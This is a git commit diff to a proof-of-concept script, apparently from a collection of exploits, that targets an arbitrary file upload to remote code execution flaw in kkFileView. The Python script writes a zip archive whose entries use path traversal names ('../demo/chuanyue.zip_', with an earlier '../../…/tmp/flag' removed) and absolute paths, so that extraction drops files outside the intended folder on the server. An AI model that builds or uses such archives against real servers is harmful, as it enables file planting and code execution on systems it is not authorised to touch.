ad2b603c378512c74b7ae2e028def6d0667eab53
k3ppf0r <2094289254@qq.com>
2024-08-14 13:33:25 +0800

    update

--- 2024-5-11/kkFileView 任意文件上传致远程代码执行漏洞（国产）√/kkfileview_poc.py
+++ 2024-5-11/kkFileView 任意文件上传致远程代码执行漏洞（国产）√/kkfileview_poc.py
@@ -1,15 +1,16 @@
 import zipfile
-
+import os
 if __name__ == "__main__":
     try:
-        binary1 = b'k'
-        binary2 = b'hacked_by_k3ppf0r'
-        zipFile = zipfile.ZipFile("hack.zip", "w", zipfile.ZIP_DEFLATED)
+        binary1 = b'1ueeeeee'
+        binary2 = b'hacked_by_1ue'
+        cur = os.path.dirname(__file__)
+        zipFile = zipfile.ZipFile(os.path.join(cur,"hack.zip"), "a", zipfile.ZIP_DEFLATED)
         info = zipfile.ZipInfo("hack.zip")
         zipFile.writestr("test", binary1)
-        zipFile.writestr(
-            "../../../../../../../../../../../../../../../../../../../tmp/flag", binary2
-        )
+        zipFile.writestr("/baoliu/111", binary1)
+        zipFile.writestr("/abc/test", binary1)
+        zipFile.writestr("../demo/chuanyue.zip_", binary1)
         zipFile.close()
     except IOError as e:
         raise e
